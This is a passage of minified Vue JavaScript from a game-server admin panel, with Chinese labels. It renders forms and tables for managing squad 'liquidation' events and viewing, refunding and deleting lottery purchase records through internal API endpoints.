ollarConfigs.enableDeclareSquadBirthLocation,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"enableDeclareSquadBirthLocation",t)},expression:"addLiquidationForm.dollarConfigs.enableDeclareSquadBirthLocation"}}),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 55px)"},attrs:{disabled:!0!==e.addLiquidationForm.dollarConfigs.enableDeclareSquadBirthLocation},model:{value:e.addLiquidationForm.dollarConfigs.declareSquadBirthLocation,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"declareSquadBirthLocation",t)},expression:"addLiquidationForm.dollarConfigs.declareSquadBirthLocation"}})],1),i("a-form-model-item",{attrs:{prop:"dollarConfigs.acceptSquadBirthLocation",label:"被清算队伍复活点"}},[i("a-switch",{model:{value:e.addLiquidationForm.dollarConfigs.enableAcceptSquadBirthLocation,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"enableAcceptSquadBirthLocation",t)},expression:"addLiquidationForm.dollarConfigs.enableAcceptSquadBirthLocation"}}),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 55px)"},attrs:{disabled:!0!==e.addLiquidationForm.dollarConfigs.enableAcceptSquadBirthLocation},model:{value:e.addLiquidationForm.dollarConfigs.acceptSquadBirthLocation,callback:function(t){e.$set(e.addLiquidationForm.dollarConfigs,"acceptSquadBirthLocation",t)},expression:"addLiquidationForm.dollarConfigs.acceptSquadBirthLocation"}})],1)],1):e._e()],2),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.liquidationListColumns,"data-source":e.liquidationListData,expandedRowKeys:e.expandedLiquidationIds,"row-key":"id",pagination:!1,loading:e.loadingLiquidationListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedLiquidationIds.find((function(e){return e===i.id}))&&e.expandedLiquidationIds.push(i.id),e.loadInitialTaskExcludeSteamIds(i),e.loadInitialTaskIncludeSteamIds(i);else{var a=Object.keys(e.expandedLiquidationIds).find((function(t){return e.expandedLiquidationIds[t]===i.id}));void 0!==a&&e.expandedLiquidationIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"declareSquadName",fn:function(t,a){return[a.declareSquadId?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/squad",query:{name:a.declareSquad.name}})}}},[e._v(e._s(a.declareSquad?a.declareSquad.name:a.declareSquadId))])]:e._e()]}},{key:"acceptSquadName",fn:function(t,a){return[a.acceptSquadId?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/squad",query:{name:a.acceptSquad.name}})}}},[e._v(e._s(a.acceptSquad?a.acceptSquad.name:a.acceptSquadId))])]:e._e()]}},{key:"status",fn:function(t){return[i("span",[e.liquidationStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.liquidationStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.liquidationStatusEnum[t]))])],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("span",[e._v("大清算操作")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:t.editSaveLoading||"cancelled"===t.status,size:"small",icon:t.isEdit?"close":"edit",type:t.isEdit?"default":"primary"},on:{click:function(e){t.isEdit=!t.isEdit}}},[e._v(e._s(t.isEdit?"取消":"编辑"))]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&t.isEdit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"save",type:"primary"},on:{click:function(){return e.submitSaveLiquidation(t)}}},[e._v("保存")]):e._e()],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("大清算开始时间:")]),i("a-date-picker",{staticStyle:{width:"300px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:t.startTimeStampEdit,allowClear:"",disabled:!t.isEdit||"processing"===t.status},on:{change:function(i){e.$set(t,"startTimeStampEdit",i)}}})],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("大清算结束时间:")]),i("a-date-picker",{staticStyle:{width:"300px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:t.endTimeStampEdit,allowClear:"",disabled:!t.isEdit||"processing"===t.status},on:{change:function(i){e.$set(t,"endTimeStampEdit",i)}}})],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("奖金分配规则:")]),i("a-radio-group",{attrs:{"button-style":"solid",size:"small",disabled:!t.isEdit},model:{value:t.dollarConfigsEdit.settleType,callback:function(i){e.$set(t.dollarConfigsEdit,"settleType",i)},expression:"record.dollarConfigsEdit.settleType"}},[i("a-radio-button",{attrs:{value:"contribution"}},[e._v("按劳分配")]),i("a-radio-button",{attrs:{value:"equality"}},[e._v("平均分配")])],1)],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("奖金税率:")]),i("a-input-number",{staticStyle:{width:"300px"},attrs:{min:0,max:100,disabled:!t.isEdit},model:{value:t.dollarConfigsEdit.taxPercent,callback:function(i){e.$set(t.dollarConfigsEdit,"taxPercent",i)},expression:"record.dollarConfigsEdit.taxPercent"}})],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("复活点价格:")]),i("a-input-number",{staticStyle:{width:"300px"},attrs:{min:0,disabled:!t.isEdit},model:{value:t.dollarConfigsEdit.birthLocationPrice,callback:function(i){e.$set(t.dollarConfigsEdit,"birthLocationPrice",i)},expression:"record.dollarConfigsEdit.birthLocationPrice"}})],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("发起队伍复活点:")]),i("a-switch",{attrs:{disabled:!t.isEdit},model:{value:t.dollarConfigsEdit.enableDeclareSquadBirthLocation,callback:function(i){e.$set(t.dollarConfigsEdit,"enableDeclareSquadBirthLocation",i)},expression:"record.dollarConfigsEdit.enableDeclareSquadBirthLocation"}}),i("a-input",{staticStyle:{"margin-left":"10px",width:"300px"},attrs:{disabled:!0!==t.dollarConfigsEdit.enableDeclareSquadBirthLocation||!t.isEdit},model:{value:t.dollarConfigsEdit.declareSquadBirthLocation,callback:function(i){e.$set(t.dollarConfigsEdit,"declareSquadBirthLocation",i)},expression:"record.dollarConfigsEdit.declareSquadBirthLocation"}})],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("被清算队伍复活点:")]),i("a-switch",{attrs:{disabled:!t.isEdit},model:{value:t.dollarConfigsEdit.enableAcceptSquadBirthLocation,callback:function(i){e.$set(t.dollarConfigsEdit,"enableAcceptSquadBirthLocation",i)},expression:"record.dollarConfigsEdit.enableAcceptSquadBirthLocation"}}),i("a-input",{staticStyle:{"margin-left":"10px",width:"300px"},attrs:{disabled:!0!==t.dollarConfigsEdit.enableAcceptSquadBirthLocation||!t.isEdit},model:{value:t.dollarConfigsEdit.acceptSquadBirthLocation,callback:function(i){e.$set(t.dollarConfigsEdit,"acceptSquadBirthLocation",i)},expression:"record.dollarConfigsEdit.acceptSquadBirthLocation"}})],1),i("div",{staticStyle:{"overflow-x":"auto",width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作:")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"processing"!==t.status?e._e():i("a-popconfirm",{attrs:{placement:"right",title:"确定要结算大清算吗(建议结算前审计相关击杀记录)"},on:{confirm:function(){return e.settleLiquidation(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"primary",icon:"check"}},[e._v("结算大清算")])],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"pending"!==t.status&&"processing"!==t.status?e._e():i("a-popconfirm",{attrs:{placement:"right",title:"确定要取消大清算吗"},on:{confirm:function(){return e.cancelLiquidation(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("取消大清算")])],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"cancelled"!==t.status?e._e():i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除大清算吗(大清算相关的记录将会被清空)"},on:{confirm:function(){return e.deleteLiquidation(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除大清算")])],1)]],2),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("大清算详细信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),void 0!==e.expandedLiquidationIds.find((function(e){return e===t.id}))?i("LiquidationTableExpand",{attrs:{"liquidation-data":t}}):e._e()],1)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.liquidationListPagination.pageSize,current:e.liquidationListPagination.pageNum,total:e.liquidationListPagination.total},on:{change:e.onChangeLiquidationListPagination,showSizeChange:e.onShowSizeChangeLiquidationListPagination}})],1)])])}),[],!1,null,"235c3cd2",null).exports},data:function(){return{currentTab:"bounty-hunter"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/story-lines",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"bounty-hunter"})}),this.currentTab="bounty-hunter")},methods:{}},ya=Object(S.a)(fa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"剧本模式设置"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/story-lines",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"bounty-hunter",attrs:{tab:"赏金猎人"}},["bounty-hunter"===e.currentTab?i("BountyHunter"):e._e()],1),i("a-tab-pane",{key:"liquidation",attrs:{tab:"大清算"}},["liquidation"===e.currentTab?i("Liquidation"):e._e()],1)],1)],1)])],1)}),[],!1,null,"59b9d6ca",null).exports,va={name:"LotteryRecord",components:{},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,lotteryRecordStatusEnum:{created:"已购买",goal:"中奖",fail:"未中奖",refunded:"已退款"},lotteryRecordStatusBadgeKeyValue:{created:"processing",goal:"success",fail:"error",refunded:"default"},loadingLotteryRecordListTable:!1,lotteryRecordListFilter:{userId:void 0,userName:void 0,lotteryName:void 0,status:void 0,startTimeStamp:void 0,endTimeStamp:void 0},lotteryRecordSettings:{},lotteryRecordListColumns:[{title:"ID",key:"id",dataIndex:"id",width:80,align:"center",scopedSlots:{customRender:"id"}},{title:"用户名",key:"userName",dataIndex:"userName",width:180,align:"center",scopedSlots:{customRender:"userName"}},{title:"彩票名称",key:"lotteryName",dataIndex:"lotteryName",width:180,align:"center",scopedSlots:{customRender:"lotteryName"}},{title:"投注数量",key:"number",dataIndex:"number",width:100,align:"center",scopedSlots:{customRender:"number"}},{title:"投注总价格",key:"price",dataIndex:"price",width:120,align:"center",scopedSlots:{customRender:"price"}},{title:"彩票状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],lotteryRecordListData:[],lotteryRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedLotteryRecordIds:[],cleanLoading:!1,refundLoading:!1,deleteLoading:!1,selectedRowKeys:[]}},mounted:function(){this.getLotteryRecordList()},methods:{onLotteryRecordListCleanFilter:function(){var e=this;this.lotteryRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLotteryRecordList()}))},onLotteryRecordListFilter:function(){var e=this;this.lotteryRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLotteryRecordList()}))},onChangeLotteryRecordListPagination:function(e){var t=this;this.lotteryRecordListPagination.pageNum=e,this.$nextTick((function(){t.getLotteryRecordList()}))},onShowSizeChangeLotteryRecordListPagination:function(e,t){var i=this;this.lotteryRecordListPagination.pageNum=1,this.lotteryRecordListPagination.pageSize=t,this.$nextTick((function(){i.getLotteryRecordList()}))},getLotteryRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.lotteryRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.lotteryRecordListFilter={userId:void 0,userName:void 0,lotteryName:void 0,status:void 0,startTimeStamp:void 0,endTimeStamp:void 0},o={pageNum:n,pageSize:r}):(l=Object(A.cloneDeep)(t.lotteryRecordListFilter),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingLotteryRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/lotteryAdminSys/listLotteryRecord",params:o});case 6:c=i.sent,t.loadingLotteryRecordListTable=!1,200===c.status&&(t.lotteryRecordListPagination.total=c.data.count,t.lotteryRecordListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingLotteryRecordListTable=!1;case 15:t.selectedRowKeys=[];case 16:case"end":return i.stop()}}),i,null,[[3,11]])})))()},refundLottery:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,t.refundLoading=!0,i.next=5,f({method:"POST",url:"/lotteryAdminSys/refundLottery",data:a});case 5:200===i.sent.status&&(t.refundLoading=!1,t.$message.success("操作成功"),t.getLotteryRecordList()),i.next=13;break;case 9:i.prev=9,i.t0=i.catch(1),t.refundLoading=!1,console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[1,9]])})))()},refundLotteries:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"POST",url:"/lotteryAdminSys/refundLotteries",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID退款出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getLotteryRecordList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},deleteLotteryRecord:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,t.deleteLoading=!0,i.next=5,f({method:"DELETE",url:"/lotteryAdminSys/deleteLottery",params:a});case 5:200===i.sent.status&&(t.deleteLoading=!1,t.$message.success("操作成功"),t.getLotteryRecordList()),i.next=13;break;case 9:i.prev=9,i.t0=i.catch(1),t.deleteLoading=!1,console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[1,9]])})))()},deleteLotteries:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"POST",url:"/lotteryAdminSys/refundLotteries",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getLotteryRecordList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},cleanLotteryRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/lotteryAdminSys/cleanLotteryRecord"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getLotteryRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},xa=Object(S.a)(va,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("span",{staticStyle:{float:"right"},on:{click:function(e){e.stopPropagation(),e.preventDefault()}}},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空公益彩票购买列表吗"},on:{confirm:e.cleanLotteryRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空购买记录")])],1)],1):e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLotteryRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLotteryRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"primary",size:"small",icon:"rollback"},on:{click:function(){return e.refundLotteries()}}},[e._v("退款选中")]):e._e(),e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中记录吗"},on:{confirm:function(){return e.deleteLotteries()}}},[e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("用户ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lotteryRecordListFilter.userId,callback:function(t){e.$set(e.lotteryRecordListFilter,"userId",t)},expression:"lotteryRecordListFilter.userId"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("用户名:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lotteryRecordListFilter.userName,callback:function(t){e.$set(e.lotteryRecordListFilter,"userName",t)},expression:"lotteryRecordListFilter.userName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("彩票名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lotteryRecordListFilter.lotteryName,callback:function(t){e.$set(e.lotteryRecordListFilter,"lotteryName",t)},expression:"lotteryRecordListFilter.lotteryName"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("彩票状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.lotteryRecordListFilter.status,callback:function(t){e.$set(e.lotteryRecordListFilter,"status",t)},expression:"lotteryRecordListFilter.status"}},[i("a-select-option",{key:"created",attrs:{title:"已购买"}},[e._v("已购买")]),i("a-select-option",{key:"goal",attrs:{title:"中奖"}},[e._v("中奖")]),i("a-select-option",{key:"fail",attrs:{title:"未中奖"}},[e._v("未中奖")]),i("a-select-option",{key:"refunded",attrs:{title:"已退款"}},[e._v("已退款")])],1),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.lotteryRecordListFilter.startTimeStamp,e.lotteryRecordListFilter.endTimeStamp],allowClear:""},on:{change:function(t){e.$set(e.lotteryRecordListFilter,"startTimeStamp",t[0]),e.$set(e.lotteryRecordListFilter,"endTimeStamp",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.lotteryRecordListColumns,"data-source":e.lotteryRecordListData,expandedRowKeys:e.expandedLotteryRecordIds,"row-key":"id",pagination:!1,loading:e.loadingLotteryRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedLotteryRecordIds.find((function(e){return e===i.id}))&&e.expandedLotteryRecordIds.push(i.id);else{var a=Object.keys(e.expandedLotteryRecordIds).find((function(t){return e.expandedLotteryRecordIds[t]===i.id}));void 0!==a&&e.expandedLotteryRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"userName",fn:function(t,a){return[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{name:a.user.userName}})}}},[e._v(e._s(a.user&&a.user.userName?a.user.userName:a.userId))])]}},{key:"lotteryName",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"number",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"price",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"status",fn:function(t){return[i("span",[e.lotteryRecordStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.lotteryRecordStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.lotteryRecordStatusEnum[t]))])],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-right":"10px"},attrs:{size:"small",icon:"rollback",type:"primary",loading:e.refundLoading},on:{click:function(){return e.refundLottery(t.id)}}},[e._v("退款")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除购买记录吗"},on:{confirm:function(){return e.deleteLotteryRecord(t.id)}}},[i("a-button",{attrs:{type:"danger",size:"small",icon:"delete",loading:e.deleteLoading}},[e._v("删除")])],1):e._e()],1),void 0!==t.points&&void 0!==t.points.value&&t.points.value.length>0?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("投注号码")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},e._l(t.points.value,(function(t,a){return i("span",{key:a,staticStyle:{"font-weight":"bolder"},style:{marginLeft:0===a?"0":"10px"}},[e._v(e._s(t))])})),0)]:e._e(),"goal"===t.status?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("中奖奖金")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px","font-weight":"bolder",color:"#18900f"}},[e._v(" $"+e._s(t.bonus)+" ")])]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.lotteryRecordListPagination.pageSize,current:e.lotteryRecordListPagination.pageNum,total:e.lotteryRecordListPagination.total},on:{change:e.onChangeLotteryRecordListPagination,showSizeChange:e.onShowSizeChangeLotteryRecordListPagination}})],1)])])}),[],!1,null,"4c20bccb",null).exports,ba={name:"LotteryDrawRecord",components:{},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,loadingLotteryDrawRecordListTable:!1,lotteryDrawRecordListFilter:{lotteryName:void 0,startTimeStamp:void 0,endTimeStamp:void 0},lotteryDrawRecordSettings:{},lotteryDrawRecordListColumns:[{title:"ID",key:"id",dataIndex:"id",width:80,align:"center",scopedSlots:{customRender:"id"}},{title:"彩票名称",key:"lotteryName",dataIndex:"lotteryName",width:180,align:"center",scopedSlots:{customRender:"lotteryName"}},{title:"开奖时间",key:"drawTimeStamp",dataIndex:"drawTimeStamp",width:120,align:"center",scopedSlots:{customRender:"drawTimeStamp"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],lotteryDrawRecordListData:[],lotteryDrawRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedLotteryDrawRecordIds:[],drawLoading:!1}},mounted:function(){this.getLotteryDrawRecordList()},methods:{onLotteryDrawRecordListCleanFilter:function(){var e=this;this.lotteryDrawRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLotteryDrawRecordList()}))},onLotteryDrawRecordListFilter:function(){var e=this;this.lotteryDrawRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLotteryDrawRecordList()}))},onChangeLotteryDrawRecordListPagination:function(e){var 